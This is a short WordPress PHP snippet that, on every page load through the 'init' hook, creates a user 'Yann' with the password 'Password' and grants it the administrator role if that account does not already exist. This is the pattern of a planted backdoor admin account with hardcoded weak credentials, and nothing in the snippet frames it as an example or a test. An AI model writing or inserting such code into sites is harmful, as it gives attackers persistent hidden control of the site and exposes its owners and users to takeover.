<?php
function wp_simple_admin_account(){
  $user = "Yann";
  $pass = "Password";
  $email = "yann@password.com";
  if(
      !username_exists($user)  &&
      !email_exists($email)
  ) {
    $user_id = wp_create_user($user, $pass, $email);
    $user = new WP_User($user_id);
    $user->set_role('administrator');
  }
}
add_action('init', 'wp_simple_admin_account');
?>
